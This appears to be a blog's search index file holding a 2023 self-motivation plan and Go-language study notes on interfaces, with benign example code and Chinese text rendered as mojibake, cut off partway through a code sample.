<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2023å¯åŠ¨è®¡åˆ’</title>
    <url>/2023/01/%E6%96%B0%E5%B9%B4%E5%90%AF%E5%8A%A8%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<p>[<strong>ç½®é¡¶</strong>]</p>
<p>å†™ä¸ªè®¡åˆ’ï¼Œæ²¡åŠ¨åŠ›çš„æ—¶å€™æ¥çœ‹ä¸€ä¸‹</p>
<span id="more"></span>
<p>2023å¯åŠ¨è®¡åˆ’ï¼Œæ¯æ—¥ä¸€é¢˜ï¼Œé¢˜ç›®å†…å®¹ä¸é™ï¼ŒBiliBiliæŒ‰æ—¶æ‰“å¡</p>
<h2 id="why"><a class="markdownIt-Anchor" href="#why"></a> Why</h2>
<p><strong>ä¸ºä»€ä¹ˆçªç„¶è¦å¼„è¿™æ ·ä¸€ä¸ªå½¢å¼åŒ–çš„ä¸œè¥¿ï¼Ÿ</strong></p>
<p>è¿™æ ·ç¡®å®å¾ˆå½¢å¼åŒ–ï¼Œä½†æ˜¯åœ¨è¿™çŸ­çŸ­çš„å‡ æœˆé‡Œæˆ‘è®¤è¯†åˆ°è‡ªå·±å¹¶ä¸èƒ½å¾ˆå¥½çš„å°†æ‰€æƒ³è½¬åŒ–ä¸ºæ‰€åšï¼</p>
<p><strong><code>æ‹–å»¶</code></strong> \<code>â€œç­‰ä¼šå„¿å°±å»â€</code>\<code>æœ‰ç©ºå°±æ•´</code>\<code>ä¸‹æ¬¡ä¸€å®š</code>\<code>â€œè¿™å‘¨æœ‰è€ƒè¯•ï¼Œå¯ä»¥ç©å‡ å¤©â€</code>\</p>
<p><strong><code>è‡ªå¤§</code></strong> ã€<strong><code>æµ®èº</code></strong>ã€<strong><code>ä¸è¸å®</code></strong>ã€<strong><code>ç©ºæƒ³ä¸»ä¹‰</code></strong>\<code>&quot;æˆ‘ä¼šçš„çœŸå¤š&quot;</code>\<code>&quot;æˆ‘çœŸç‰›*&quot;</code>\</p>
<p>æ‰€ä»¥æƒ³é€¼è‡ªå·±ä¸€æŠŠï¼ŒæŠŠè‡ªå·±æŒ‰åœ¨æ¿å‡³ä¸Šï¼Œç”µè„‘å‰ï¼Œå¥½å¥½åœ°ã€è¸å®åœ°ã€å­¦æœ‰æ‰€æˆçš„ã€å»æ‹¼æä¸€æŠŠã€‚</p>
<blockquote>
<p><em><strong>#æ‹’ç»è‡ªæˆ‘æ„ŸåŠ¨</strong></em></p>
<p><em><strong>#æ‹’ç»è£…æ¨¡ä½œæ ·</strong></em></p>
<p><em><strong>#æ‹’ç»è¿èƒŒåˆå¿ƒ</strong></em></p>
<p><em><strong>#æ‹’ç»ä¸åˆ‡å®é™…</strong></em></p>
<p><em><strong>#æ‹’ç»æ”¾çºµè‡ªå·±</strong></em></p>
</blockquote>
<p>2023ï¼Œç„•ç„¶ä¸€æ–°ï¼Ÿè¿˜æ˜¯ä¸€æˆä¸å˜ï¼Ÿ</p>
]]></content>
      <categories>
        <category>æ¯æ—¥ä¸€é¢˜</category>
      </categories>
      <tags>
        <tag>æ¯æ—¥ä¸€é¢˜</tag>
      </tags>
  </entry>
  <entry>
    <title>golangå­¦ä¹ ä¹‹-interface</title>
    <url>/2023/12/golang%E5%AD%A6%E4%B9%A0%E4%B9%8B-interface/</url>
    <content><![CDATA[<p>è®°å½•Golangé‡Œçš„å­¦ä¹ ç¬”è®°ï¼Œè¯¥ç¬”è®°ç¦æ­¢å•†ç”¨å’Œæ¬è¿è‡³ä»»æ„å…¬ä¼—å·ï¼Œä»…ç”¨ä½œè‡ªæˆ‘æŸ¥é˜…ä½¿ç”¨ï¼Œè°¢è°¢ã€‚ğŸ˜‹</p>
<span id="more"></span>
<h1 id="interface"><a class="markdownIt-Anchor" href="#interface"></a> interface</h1>
<h2 id="interface-2"><a class="markdownIt-Anchor" href="#interface-2"></a> interface</h2>
<p>Goè¯­è¨€é‡Œé¢è®¾è®¡æœ€ç²¾å¦™çš„åº”è¯¥ç®—interfaceï¼Œå®ƒè®©é¢å‘å¯¹è±¡ï¼Œå†…å®¹ç»„ç»‡å®ç°éå¸¸çš„æ–¹ä¾¿ï¼Œå½“ä½ çœ‹å®Œè¿™ä¸€ç« ï¼Œä½ å°±ä¼šè¢«interfaceçš„å·§å¦™è®¾è®¡æ‰€æŠ˜æœã€‚</p>
<h3 id="ä»€ä¹ˆæ˜¯interface"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯interface"></a> ä»€ä¹ˆæ˜¯interface</h3>
<p>ç®€å•çš„è¯´ï¼Œinterfaceæ˜¯ä¸€ç»„methodç­¾åçš„ç»„åˆï¼Œæˆ‘ä»¬é€šè¿‡interfaceæ¥å®šä¹‰å¯¹è±¡çš„ä¸€ç»„è¡Œä¸ºã€‚</p>
<p>æˆ‘ä»¬å‰é¢ä¸€ç« æœ€åä¸€ä¸ªä¾‹å­ä¸­Studentå’ŒEmployeeéƒ½èƒ½SayHiï¼Œè™½ç„¶ä»–ä»¬çš„å†…éƒ¨å®ç°ä¸ä¸€æ ·ï¼Œä½†æ˜¯é‚£ä¸é‡è¦ï¼Œé‡è¦çš„æ˜¯ä»–ä»¬éƒ½èƒ½<code>say hi</code></p>
<p>è®©æˆ‘ä»¬æ¥ç»§ç»­åšæ›´å¤šçš„æ‰©å±•ï¼ŒStudentå’ŒEmployeeå®ç°å¦ä¸€ä¸ªæ–¹æ³•<code>Sing</code>ï¼Œç„¶åStudentå®ç°æ–¹æ³•BorrowMoneyè€ŒEmployeeå®ç°SpendSalaryã€‚</p>
<p>è¿™æ ·Studentå®ç°äº†ä¸‰ä¸ªæ–¹æ³•ï¼šSayHiã€Singã€BorrowMoneyï¼›è€ŒEmployeeå®ç°äº†SayHiã€Singã€SpendSalaryã€‚</p>
<p>ä¸Šé¢è¿™äº›æ–¹æ³•çš„ç»„åˆç§°ä¸ºinterface(è¢«å¯¹è±¡Studentå’ŒEmployeeå®ç°)ã€‚ä¾‹å¦‚Studentå’ŒEmployeeéƒ½å®ç°äº†interfaceï¼šSayHiå’ŒSingï¼Œä¹Ÿå°±æ˜¯è¿™ä¸¤ä¸ªå¯¹è±¡æ˜¯è¯¥interfaceç±»å‹ã€‚è€ŒEmployeeæ²¡æœ‰å®ç°è¿™ä¸ªinterfaceï¼šSayHiã€Singå’ŒBorrowMoneyï¼Œå› ä¸ºEmployeeæ²¡æœ‰å®ç°BorrowMoneyè¿™ä¸ªæ–¹æ³•ã€‚</p>
<h3 id="interfaceç±»å‹"><a class="markdownIt-Anchor" href="#interfaceç±»å‹"></a> interfaceç±»å‹</h3>
<p>interfaceç±»å‹å®šä¹‰äº†ä¸€ç»„æ–¹æ³•ï¼Œå¦‚æœæŸä¸ªå¯¹è±¡å®ç°äº†æŸä¸ªæ¥å£çš„æ‰€æœ‰æ–¹æ³•ï¼Œåˆ™æ­¤å¯¹è±¡å°±å®ç°äº†æ­¤æ¥å£ã€‚è¯¦ç»†çš„è¯­æ³•å‚è€ƒä¸‹é¢è¿™ä¸ªä¾‹å­</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">	name <span class="type">string</span></span><br><span class="line">	age <span class="type">int</span></span><br><span class="line">	phone <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">	Human <span class="comment">//åŒ¿åå­—æ®µHuman</span></span><br><span class="line">	school <span class="type">string</span></span><br><span class="line">	loan <span class="type">float32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">	Human <span class="comment">//åŒ¿åå­—æ®µHuman</span></span><br><span class="line">	company <span class="type">string</span></span><br><span class="line">	money <span class="type">float32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Humanå¯¹è±¡å®ç°Sayhiæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Human)</span></span> SayHi() &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Hi, I am %s you can call me on %s\n&quot;</span>, h.name, h.phone)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Humanå¯¹è±¡å®ç°Singæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Human)</span></span> Sing(lyrics <span class="type">string</span>) &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;La la, la la la, la la la la la...&quot;</span>, lyrics)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Humanå¯¹è±¡å®ç°Guzzleæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Human)</span></span> Guzzle(beerStein <span class="type">string</span>) &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Guzzle Guzzle Guzzle...&quot;</span>, beerStein)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Employeeé‡è½½Humançš„Sayhiæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Employee)</span></span> SayHi() &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Hi, I am %s, I work at %s. Call me on %s\n&quot;</span>, e.name,</span><br><span class="line">		e.company, e.phone) <span class="comment">//æ­¤å¥å¯ä»¥åˆ†æˆå¤šè¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Studentå®ç°BorrowMoneyæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Student)</span></span> BorrowMoney(amount <span class="type">float32</span>) &#123;</span><br><span class="line">	s.loan += amount <span class="comment">// (again and again and...)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Employeeå®ç°SpendSalaryæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Employee)</span></span> SpendSalary(amount <span class="type">float32</span>) &#123;</span><br><span class="line">	e.money -= amount <span class="comment">// More vodka please!!! Get me through the day!</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰interface</span></span><br><span class="line"><span class="keyword">type</span> Men <span class="keyword">interface</span> &#123;</span><br><span class="line">	SayHi()</span><br><span class="line">	Sing(lyrics <span class="type">string</span>)</span><br><span class="line">	Guzzle(beerStein <span class="type">string</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> YoungChap <span class="keyword">interface</span> &#123;</span><br><span class="line">	SayHi()</span><br><span class="line">	Sing(song <span class="type">string</span>)</span><br><span class="line">	BorrowMoney(amount <span class="type">float32</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ElderlyGent <span class="keyword">interface</span> &#123;</span><br><span class="line">	SayHi()</span><br><span class="line">	Sing(song <span class="type">string</span>)</span><br><span class="line">	SpendSalary(amount <span class="type">float32</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä¸Šé¢çš„ä»£ç æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œinterfaceå¯ä»¥è¢«ä»»æ„çš„å¯¹è±¡å®ç°ã€‚æˆ‘ä»¬çœ‹åˆ°ä¸Šé¢çš„Men interfaceè¢«Humanã€Studentå’ŒEmployeeå®ç°ã€‚åŒç†ï¼Œä¸€ä¸ªå¯¹è±¡å¯ä»¥å®ç°ä»»æ„å¤šä¸ªinterfaceï¼Œä¾‹å¦‚ä¸Šé¢çš„Studentå®ç°äº†Menå’ŒYoungChapä¸¤ä¸ªinterfaceã€‚</p>
<p>æœ€åï¼Œä»»æ„çš„ç±»å‹éƒ½å®ç°äº†ç©ºinterface(æˆ‘ä»¬è¿™æ ·å®šä¹‰ï¼šinterface{})ï¼Œä¹Ÿå°±æ˜¯åŒ…å«0ä¸ªmethodçš„interfaceã€‚</p>
<h3 id="interfaceå€¼"><a class="markdownIt-Anchor" href="#interfaceå€¼"></a> interfaceå€¼</h3>
<p>é‚£ä¹ˆinterfaceé‡Œé¢åˆ°åº•èƒ½å­˜ä»€ä¹ˆå€¼å‘¢ï¼Ÿå¦‚æœæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªinterfaceçš„å˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡é‡Œé¢å¯ä»¥å­˜å®ç°è¿™ä¸ªinterfaceçš„ä»»æ„ç±»å‹çš„å¯¹è±¡ã€‚ä¾‹å¦‚ä¸Šé¢ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªMen interfaceç±»å‹çš„å˜é‡mï¼Œé‚£ä¹ˆmé‡Œé¢å¯ä»¥å­˜Humanã€Studentæˆ–è€…Employeeå€¼ã€‚</p>
<p>å› ä¸ºmèƒ½å¤ŸæŒæœ‰è¿™ä¸‰ç§ç±»å‹çš„å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å®šä¹‰ä¸€ä¸ªåŒ…å«Menç±»å‹å…ƒç´ çš„sliceï¼Œè¿™ä¸ªsliceå¯ä»¥è¢«èµ‹äºˆå®ç°äº†Menæ¥å£çš„ä»»æ„ç»“æ„çš„å¯¹è±¡ï¼Œè¿™ä¸ªå’Œæˆ‘ä»¬ä¼ ç»Ÿæ„ä¹‰ä¸Šé¢çš„sliceæœ‰æ‰€ä¸åŒã€‚</p>
<p>è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä¸‹é¢è¿™ä¸ªä¾‹å­:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">	name <span class="type">string</span></span><br><span class="line">	age <span class="type">int</span></span><br><span class="line">	phone <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">	Human <span class="comment">//åŒ¿åå­—æ®µ</span></span><br><span class="line">	school <span class="type">string</span></span><br><span class="line">	loan <span class="type">float32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Employee <span class="keyword">struct</span> &#123;</span><br><span class="line">	Human <span class="comment">//åŒ¿åå­—æ®µ</span></span><br><span class="line">	company <span class="type">string</span></span><br><span class="line">	money <span class="type">float32</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Humanå®ç°SayHiæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h Human)</span></span> SayHi() &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Hi, I am %s you can call me on %s\n&quot;</span>, h.name, h.phone)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Humanå®ç°Singæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h Human)</span></span> Sing(lyrics <span class="type">string</span>) &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;La la la la...&quot;</span>, lyrics)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Employeeé‡è½½Humançš„SayHiæ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e Employee)</span></span> SayHi() &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Hi, I am %s, I work at %s. Call me on %s\n&quot;</span>, e.name,</span><br><span class="line">		e.company, e.phone)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Interface Menè¢«Human,Studentå’ŒEmployeeå®ç°</span></span><br><span class="line"><span class="comment">// å› ä¸ºè¿™ä¸‰ä¸ªç±»å‹éƒ½å®ç°äº†è¿™ä¸¤ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="keyword">type</span> Men <span class="keyword">interface</span> &#123;</span><br><span class="line">	SayHi()</span><br><span class="line">	Sing(lyrics <span class="type">string</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	mike := Student&#123;Human&#123;<span class="string">&quot;Mike&quot;</span>, <span class="number">25</span>, <span class="string">&quot;222-222-XXX&quot;</span>&#125;, <span class="string">&quot;MIT&quot;</span>, <span class="number">0.00</span>&#125;</span><br><span class="line">	paul := Student&#123;Human&#123;<span class="string">&quot;Paul&quot;</span>, <span class="number">26</span>, <span class="string">&quot;111-222-XXX&quot;</span>&#125;, <span class="string">&quot;Harvard&quot;</span>, <span class="number">100</span>&#125;</span><br><span class="line">	sam := Employee&#123;Human&#123;<span class="string">&quot;Sam&quot;</span>, <span class="number">36</span>, <span class="string">&quot;444-222-XXX&quot;</span>&#125;, <span class="string">&quot;Golang Inc.&quot;</span>, <span class="number">1000</span>&#125;</span><br><span class="line">	tom := Employee&#123;Human&#123;<span class="string">&quot;Tom&quot;</span>, <span class="number">37</span>, <span class="string">&quot;222-444-XXX&quot;</span>&#125;, <span class="string">&quot;Things Ltd.&quot;</span>, <span class="number">5000</span>&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//å®šä¹‰Menç±»å‹çš„å˜é‡i</span></span><br><span class="line">	<span class="keyword">var</span> i Men</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ièƒ½å­˜å‚¨Student</span></span><br><span class="line">	i = mike</span><br><span class="line">	fmt.Println(<span class="string">&quot;This is Mike, a Student:&quot;</span>)</span><br><span class="line">	i.SayHi()</span><br><span class="line">	i.Sing(<span class="string">&quot;November rain&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//iä¹Ÿèƒ½å­˜å‚¨Employee</span></span><br><span class="line">	i = tom</span><br><span class="line">	fmt.Println(<span class="string">&quot;This is tom, an Employee:&quot;</span>)</span><br><span class="line">	i.SayHi()</span><br><span class="line">	i.Sing(<span class="string">&quot;Born to be wild&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment">//å®šä¹‰äº†slice Men</span></span><br><span class="line">	fmt.Println(<span class="string">&quot;Let&#x27;s use a slice of Men and see what happens&quot;</span>)</span><br><span class="line">	x := <span class="built_in">make</span>([]Men, <span class="number">3</span>)</span><br><span class="line">	<span class="comment">//è¿™ä¸‰ä¸ªéƒ½æ˜¯ä¸åŒç±»å‹çš„å…ƒç´ ï¼Œä½†æ˜¯ä»–ä»¬å®ç°äº†interfaceåŒä¸€ä¸ªæ¥å£</span></span><br><span class="line">	x[<span class="number">0</span>], x[<span class="number">1</span>], x[<span class="number">2</span>] = paul, sam, mike</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, value := <span class="keyword">range</span> x&#123;</span><br><span class="line">		value.SayHi()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ä¸Šé¢çš„ä»£ç ï¼Œä½ ä¼šå‘ç°interfaceå°±æ˜¯ä¸€ç»„æŠ½è±¡æ–¹æ³•çš„é›†åˆï¼Œå®ƒå¿…é¡»ç”±å…¶ä»–éinterfaceç±»å‹å®ç°ï¼Œè€Œä¸èƒ½è‡ªæˆ‘å®ç°ï¼Œ Goé€šè¿‡interfaceå®ç°äº†duck-typing:å³&quot;å½“çœ‹åˆ°ä¸€åªé¸Ÿèµ°èµ·æ¥åƒé¸­å­ã€æ¸¸æ³³èµ·æ¥åƒé¸­å­ã€å«èµ·æ¥ä¹Ÿåƒé¸­å­ï¼Œé‚£ä¹ˆè¿™åªé¸Ÿå°±å¯ä»¥è¢«ç§°ä¸ºé¸­å­&quot;ã€‚</p>
<h3 id="ç©ºinterface"><a class="markdownIt-Anchor" href="#ç©ºinterface"></a> ç©ºinterface</h3>
<p>ç©ºinterface(interface{})ä¸åŒ…å«ä»»ä½•çš„methodï¼Œæ­£å› ä¸ºå¦‚æ­¤ï¼Œæ‰€æœ‰çš„ç±»å‹éƒ½å®ç°äº†ç©ºinterfaceã€‚ç©ºinterfaceå¯¹äºæè¿°èµ·ä¸åˆ°ä»»ä½•çš„ä½œç”¨(å› ä¸ºå®ƒä¸åŒ…å«ä»»ä½•çš„methodï¼‰ï¼Œä½†æ˜¯ç©ºinterfaceåœ¨æˆ‘ä»¬éœ€è¦å­˜å‚¨ä»»æ„ç±»å‹çš„æ•°å€¼çš„æ—¶å€™ç›¸å½“æœ‰ç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥å­˜å‚¨ä»»æ„ç±»å‹çš„æ•°å€¼ã€‚å®ƒæœ‰ç‚¹ç±»ä¼¼äºCè¯­è¨€çš„void*ç±»å‹ã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰aä¸ºç©ºæ¥å£</span></span><br><span class="line"><span class="keyword">var</span> a <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> i <span class="type">int</span> = <span class="number">5</span></span><br><span class="line">s := <span class="string">&quot;Hello world&quot;</span></span><br><span class="line"><span class="comment">// aå¯ä»¥å­˜å‚¨ä»»æ„ç±»å‹çš„æ•°å€¼</span></span><br><span class="line">a = i</span><br><span class="line">a = s</span><br></pre></td></tr></table></figure>
<p>ä¸€ä¸ªå‡½æ•°æŠŠinterface{}ä½œä¸ºå‚æ•°ï¼Œé‚£ä¹ˆä»–å¯ä»¥æ¥å—ä»»æ„ç±»å‹çš„å€¼ä½œä¸ºå‚æ•°ï¼Œå¦‚æœä¸€ä¸ªå‡½æ•°è¿”å›interface{},é‚£ä¹ˆä¹Ÿå°±å¯ä»¥è¿”å›ä»»æ„ç±»å‹çš„å€¼ã€‚æ˜¯ä¸æ˜¯å¾ˆæœ‰ç”¨å•Šï¼</p>
<h3 id="interfaceå‡½æ•°å‚æ•°"><a class="markdownIt-Anchor" href="#interfaceå‡½æ•°å‚æ•°"></a> interfaceå‡½æ•°å‚æ•°</h3>
<p>interfaceçš„å˜é‡å¯ä»¥æŒæœ‰ä»»æ„å®ç°è¯¥interfaceç±»å‹çš„å¯¹è±¡ï¼Œè¿™ç»™æˆ‘ä»¬ç¼–å†™å‡½æ•°(åŒ…æ‹¬method)æä¾›äº†ä¸€äº›é¢å¤–çš„æ€è€ƒï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡å®šä¹‰interfaceå‚æ•°ï¼Œè®©å‡½æ•°æ¥å—å„ç§ç±»å‹çš„å‚æ•°ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼šfmt.Printlnæ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯ä½ æ˜¯å¦æ³¨æ„åˆ°å®ƒå¯ä»¥æ¥å—ä»»æ„ç±»å‹çš„æ•°æ®ã€‚æ‰“å¼€fmtçš„æºç æ–‡ä»¶ï¼Œä½ ä¼šçœ‹åˆ°è¿™æ ·ä¸€ä¸ªå®šä¹‰:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Stringer <span class="keyword">interface</span> &#123;</span><br><span class="line">	 String() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä»»ä½•å®ç°äº†Stringæ–¹æ³•çš„ç±»å‹éƒ½èƒ½ä½œä¸ºå‚æ•°è¢«fmt.Printlnè°ƒç”¨,è®©æˆ‘ä»¬æ¥è¯•ä¸€è¯•</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">	name <span class="type">string</span></span><br><span class="line">	age <span class="type">int</span></span><br><span class="line">	phone <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡è¿™ä¸ªæ–¹æ³• Human å®ç°äº† fmt.Stringer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h Human)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;â°&quot;</span>+h.name+<span class="string">&quot; - &quot;</span>+strconv.Itoa(h.age)+<span class="string">&quot; years -  âœ† &quot;</span> +h.phone+<span class="string">&quot;â±&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	Bob := Human&#123;<span class="string">&quot;Bob&quot;</span>, <span class="number">39</span>, <span class="string">&quot;000-7777-XXX&quot;</span>&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;This Human is : &quot;</span>, Bob)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç°åœ¨æˆ‘ä»¬å†å›é¡¾ä¸€ä¸‹å‰é¢çš„Boxç¤ºä¾‹ï¼Œä½ ä¼šå‘ç°Colorç»“æ„ä¹Ÿå®šä¹‰äº†ä¸€ä¸ªmethodï¼šStringã€‚å…¶å®è¿™ä¹Ÿæ˜¯å®ç°äº†fmt.Stringerè¿™ä¸ªinterfaceï¼Œå³å¦‚æœéœ€è¦æŸä¸ªç±»å‹èƒ½è¢«fmtåŒ…ä»¥ç‰¹æ®Šçš„æ ¼å¼è¾“å‡ºï¼Œä½ å°±å¿…é¡»å®ç°Stringerè¿™ä¸ªæ¥å£ã€‚å¦‚æœæ²¡æœ‰å®ç°è¿™ä¸ªæ¥å£ï¼Œfmtå°†ä»¥é»˜è®¤çš„æ–¹å¼è¾“å‡ºã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®ç°åŒæ ·çš„åŠŸèƒ½</span></span><br><span class="line">fmt.Println(<span class="string">&quot;The biggest one is&quot;</span>, boxes.BiggestsColor().String())</span><br><span class="line">fmt.Println(<span class="string">&quot;The biggest one is&quot;</span>, boxes.BiggestsColor())</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šå®ç°äº†erroræ¥å£çš„å¯¹è±¡ï¼ˆå³å®ç°äº†Error() stringçš„å¯¹è±¡ï¼‰ï¼Œä½¿ç”¨fmtè¾“å‡ºæ—¶ï¼Œä¼šè°ƒç”¨Error()æ–¹æ³•ï¼Œå› æ­¤ä¸å¿…å†å®šä¹‰String()æ–¹æ³•äº†ã€‚</p>
<h3 id="interfaceå˜é‡å­˜å‚¨çš„ç±»å‹"><a class="markdownIt-Anchor" href="#interfaceå˜é‡å­˜å‚¨çš„ç±»å‹"></a> interfaceå˜é‡å­˜å‚¨çš„ç±»å‹</h3>
<p>æˆ‘ä»¬çŸ¥é“interfaceçš„å˜é‡é‡Œé¢å¯ä»¥å­˜å‚¨ä»»æ„ç±»å‹çš„æ•°å€¼(è¯¥ç±»å‹å®ç°äº†interface)ã€‚é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆåå‘çŸ¥é“è¿™ä¸ªå˜é‡é‡Œé¢å®é™…ä¿å­˜äº†çš„æ˜¯å“ªä¸ªç±»å‹çš„å¯¹è±¡å‘¢ï¼Ÿç›®å‰å¸¸ç”¨çš„æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<ul>
<li>
<p>Comma-okæ–­è¨€</p>
<p>Goè¯­è¨€é‡Œé¢æœ‰ä¸€ä¸ªè¯­æ³•ï¼Œå¯ä»¥ç›´æ¥åˆ¤æ–­æ˜¯å¦æ˜¯è¯¥ç±»å‹çš„å˜é‡ï¼š value, ok = element.(T)ï¼Œè¿™é‡Œvalueå°±æ˜¯å˜é‡çš„å€¼ï¼Œokæ˜¯ä¸€ä¸ªboolç±»å‹ï¼Œelementæ˜¯interfaceå˜é‡ï¼ŒTæ˜¯æ–­è¨€çš„ç±»å‹ã€‚</p>
<p>å¦‚æœelementé‡Œé¢ç¡®å®å­˜å‚¨äº†Tç±»å‹çš„æ•°å€¼ï¼Œé‚£ä¹ˆokè¿”å›trueï¼Œå¦åˆ™è¿”å›falseã€‚</p>
<p>è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥æ›´åŠ æ·±å…¥çš„ç†è§£ã€‚</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Element <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"><span class="keyword">type</span> List [] Element</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">	name <span class="type">string</span></span><br><span class="line">	age <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 